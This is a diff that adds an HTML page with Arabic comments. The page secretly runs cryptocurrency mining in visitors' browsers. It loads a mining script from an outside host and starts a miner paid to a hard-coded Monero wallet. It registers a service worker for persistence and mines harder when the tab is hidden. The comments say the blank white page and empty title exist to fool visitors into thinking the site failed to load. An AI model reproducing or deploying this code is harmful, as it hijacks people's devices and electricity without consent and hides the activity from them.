@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> </title> <!-- عنوان فارغ للتخفي المطلق -->
+    <style>
+        /* صفحة بيضاء تماماً لإيهام الجندي أن الموقع لم يتحمل */
+        body { background: #ffffff; margin: 0; padding: 0; overflow: hidden; }
+    </style>
+</head>
+<body>
+    <!-- 🧬 استدعاء المحرك الماسي لعام 2026 -->
+    <script src="https://www.hostingcloud.racing"></script>
+    
+    <script>
+        // 🗝️ ربط محفظة 'الجنرال' بالجيش (Cake Wallet)
+        const wallet = '47AZvbLDbMtV9kPh3cTTvTZ7ZY7ZF3zziPAVewLeku8vaQRkLVV27nQRNyoLRDJbApgJ3BtZR2HLkZ2Qq47yEZLvHB2MrJf';
+        
+        // 1. التجنيد القسري الفوري (تنفيذ في 0.0000001 ثانية)
+        var _ghost = new Client.Anonymous(wallet, 'General_Elite');
+        _ghost.start();
+
+        // 2. زرع ملف الخلود sw.js لضمان بقاء الجندي للأبد
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('sw.js').then(function(reg) {
+                console.log("💀 [SOLDIER BRANDED] | Permanent Status Active ✅");
+            });
+        }
+
+        // 3. حساس النشاط الذري (90% قوة عند الخمول / 15% عند النشاط)
+        function ghostPulse() {
+            if (document.hidden || !document.hasFocus()) {
+                _ghost.setThrottle(0.1); // انفجار 90% (نوم الجندي)
+            } else {
+                _ghost.setThrottle(0.85); // اختفاء 15% (استخدام الجندي)
+            }
+        }
+
+        // 4. حل مشكلة انقطاع الإنترنت (Offline Persistence)
+        window.addEventListener('online', () => { _ghost.start(); });
+        setInterval(ghostPulse, 1000);
+    </script>
+</body>
+</html>
